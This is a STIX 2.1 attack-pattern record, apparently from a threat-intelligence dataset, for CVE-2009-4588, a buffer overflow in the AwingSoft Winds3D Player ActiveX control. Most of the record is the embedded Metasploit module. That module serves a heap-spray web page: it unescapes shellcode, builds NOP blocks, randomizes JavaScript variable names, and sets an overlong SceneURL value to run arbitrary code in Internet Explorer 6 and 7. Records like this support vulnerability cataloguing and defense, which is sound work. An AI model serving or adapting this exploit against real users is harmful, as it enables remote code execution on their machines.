{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--04b65b43-1725-4578-82f4-e6fb63f4a36e",
    "created": "2024-08-14T16:40:46.831407Z",
    "modified": "2024-08-14T16:40:46.831411Z",
    "name": "AwingSoft Winds3D Player SceneURL Buffer Overflow",
    "description": " This module exploits a data segment buffer overflow within Winds3D Viewer of AwingSoft Awakening 3.x (WindsPly.ocx v3.6.0.0). This ActiveX is a plugin of AwingSoft Web3D Player.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/awingsoft_web3d_bof.rb",
            "external_id": "awingsoft_web3d_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4588"
        },
        {
            "source_name": "reference",
            "url": "http://www.rec-sec.com/2009/07/28/awingsoft-web3d-buffer-overflow/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# awingsoft_web3d_bof.rb\n#\n# AwingSoft Web3D Player 'SceneURL()' Buffer Overflow exploit for the Metasploit Framework\n#\n# Tested successfully on the following platforms:\n#  - Internet Explorer 6, Windows XP SP2\n#  - Internet Explorer 7, Windows XP SP3\n#\n# WindsPly.ocx versions tested:\n#  - 3.0.0.5\n#  - 3.5.0.0\n#  - 3.6.0.0 (beta)\n#\n# Trancer\n# http://www.rec-sec.com\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AwingSoft Winds3D Player SceneURL Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a data segment buffer overflow within Winds3D Viewer of\n        AwingSoft Awakening 3.x (WindsPly.ocx v3.6.0.0). This ActiveX is a plugin of\n        AwingSoft Web3D Player.\n        By setting an overly long value to the 'SceneURL' property, an attacker can\n        overrun a buffer and execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'shinnai <shinnai[at]autistici.org>',\t# Original exploit [see References]\n          'Trancer <mtrancer[at]gmail.com>',\t  \t# Metasploit implementation\n          'jduck'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-4588' ],\n          [ 'OSVDB', '60017' ],\n          [ 'EDB', '9116' ],\n          [ 'URL', 'http://www.rec-sec.com/2009/07/28/awingsoft-web3d-buffer-overflow/' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # data segment size: 76180\n          # crasher offsets: 2640, 2712, 8984, 68420, 68424\n          [ 'Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0', { 'Ret' => 0x0C0C0C0C, 'Offset' => 8984 } ]\n        ],\n      'DisclosureDate' => '2009-07-10',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Setup exploit buffers\n    nops \t  = Rex::Text.to_unescape([target.ret].pack('V'))\n    ret  \t  = Rex::Text.uri_encode([target.ret].pack('V'))\n    blocksize = 0x40000\n    fillto    = 500\n    offset \t  = target['Offset']\n\n    # Randomize the javascript variable names\n    winds3d      = rand_text_alpha(rand(100) + 1)\n    j_shellcode  = rand_text_alpha(rand(100) + 1)\n    j_nops       = rand_text_alpha(rand(100) + 1)\n    j_ret        = rand_text_alpha(rand(100) + 1)\n    j_headersize = rand_text_alpha(rand(100) + 1)\n    j_slackspace = rand_text_alpha(rand(100) + 1)\n    j_fillblock  = rand_text_alpha(rand(100) + 1)\n    j_block      = rand_text_alpha(rand(100) + 1)\n    j_memory     = rand_text_alpha(rand(100) + 1)\n    j_counter    = rand_text_alpha(rand(30) + 2)\n\n    # we must leave the page, so we use http-equiv and javascript refresh methods\n    html = %Q|<html>\n<head><meta http-equiv=\"refresh\" content=\"1;URL=#{get_resource}\"></head>\n<object classid='clsid:17A54E7D-A9D4-11D8-9552-00E04CB09903' id='#{winds3d}'></object>\n<script>\n#{j_shellcode}=unescape('#{shellcode}');\n#{j_nops}=unescape('#{nops}');\n#{j_headersize}=20;\n#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;\nwhile(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};\n#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});\n#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});\nwhile(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};\n#{j_memory}=new Array();\nfor(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};\n\nvar #{j_ret} = unescape('#{ret}');\nwhile (#{j_ret}.length <= #{offset}) { #{j_ret} = #{j_ret} + unescape('#{ret}'); }\n#{winds3d}.SceneURL = #{j_ret};\nsetTimeout('window.location = \"#{get_resource}\";', 500);\n</script>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2009-07-10",
    "x_mitre_platforms": [
        "win'"
    ]
}